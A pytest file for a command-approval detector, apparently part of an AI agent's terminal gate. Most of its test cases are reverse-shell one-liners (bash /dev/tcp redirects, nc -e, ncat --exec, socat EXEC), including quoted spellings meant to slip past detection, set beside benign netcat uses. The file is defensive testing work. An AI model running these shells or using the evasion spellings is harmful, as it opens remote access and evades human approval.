"""Reverse-shell spellings Skills Guard already flags must also need approval at the terminal gate (#17873)."""

import os
import subprocess
import sys

import pytest

from tools.approval import detect_dangerous_command


@pytest.mark.parametrize("command", [
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "sh -i 5<>/dev/tcp/host/4444 0<&5",
    "exec 3<>/dev/udp/host/53",
    'bash -c "bash -i >& /dev/tcp/host/4444 0>&1"',
    "nc -e /bin/bash host 4444",
    "sudo nc -nve /bin/sh host 4444",
    "ncat -c bash host 4444",
    "ls; /usr/bin/ncat --exec /bin/sh host 4444",
    "socat tcp:host:4444 EXEC:/bin/bash",
    "socat TCP:host:4444 'SYSTEM:bash -li'",
    "nc h 1 -e /bin/sh",
    "cat x | nc -e /bin/sh host 1",
    'bash -i >& "/dev/tcp/host/4444" 0>&1',
    "bash -i >& '/dev/udp/host/53' 0>&1",
    'nc "-e" /bin/sh host 4444',
    "nc host 4444 '--exec' /bin/sh",
])
def test_reverse_shell_requires_approval(command):
    assert detect_dangerous_command(command)[0] is True


@pytest.mark.parametrize("command", [
    'echo "bash -i >& /dev/tcp/host/4444"',
    'git commit -m "detect nc -e and socat exec: shells"',
    "grep /dev/tcp notes.txt",
    "nc -zv host 80",
    "nc -z db 5432 && psql -c 'select 1'",
    "nc -zv h 80 || echo -e down",
    "socat TCP-LISTEN:80 TCP:h:80 & echo exec:started",
    "socat - tcp:host:80",
    "nc -z host 80 # -e example",
    "nc -C mail.example.com 25",
    "nc -vC host 25",
    "ncat -vC host 25",
    "nc-wrapper -e foo",
    "socat - TCP:localhost:80 # exec: plain forwarding",
])
def test_reverse_shell_prose_and_plain_netcat_not_flagged(command):
    assert detect_dangerous_command(command)[0] is False


def test_socat_prefix_executable_does_not_need_reverse_shell_approval():
    assert detect_dangerous_command("socat-wrapper TCP:host:4444 EXEC:/bin/bash")[0] is False


# A quoted redirect target opens the same socket; only `>&` was caught before, via the `&` separator split.
@pytest.mark.parametrize("command", [
    'bash -i > "/dev/tcp/h/1" 0>&1',
    'sh -i < "/dev/tcp/h/1"',
    "sh -i 0<'/dev/tcp/h/1' 1>&0",
    'exec 3<>"/dev/tcp/h/80"',
    'bash -i &> "/dev/tcp/h/1" 0>&1',
    'echo x >> "/dev/udp/h/53"',
    'bash -i > /dev/"tcp"/h/1 0>&1',
    'bash -c \'bash -i > "/dev/tcp/h/1" 0>&1\'',
    'bash -i > /"dev"/tcp/h/1 0>&1',
    "sh -i < /'dev'/tcp/h/1 1>&0",
    'echo x > /d"e"v/tcp/h/1',
])
def test_quoted_dev_tcp_redirect_target_requires_approval(command):
    assert detect_dangerous_command(command)[0] is True


@pytest.mark.parametrize("command", [
    'echo "> /dev/tcp/h/1" > notes.md',
    "cat <<<'/dev/tcp/h/1'",
    "ls > out.txt; grep /dev/tcp notes",
])
def test_dev_tcp_in_data_or_here_string_not_flagged(command):
    assert detect_dangerous_command(command)[0] is False


def test_dev_socket_redirect_scan_is_linear_on_a_long_digit_run():
    # A `[0-9]*` fd prefix on the operator regex rescanned a digit run from every offset (~21 s at 50k
    # chars, holding the GIL), so the probe runs in a subprocess with a timeout.
    repo_root = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    code = """
import time
from tools.approval_detection import _DevSocketRedirectMatcher
started = time.perf_counter()
assert _DevSocketRedirectMatcher().search("cat /dev/ " + "1" * 50_000 + " x ; true") is None
assert time.perf_counter() - started < 2.0
"""
    subprocess.run([sys.executable, "-c", code], check=True, timeout=20, cwd=repo_root,
                   env={**os.environ, "PYTHONPATH": repo_root})
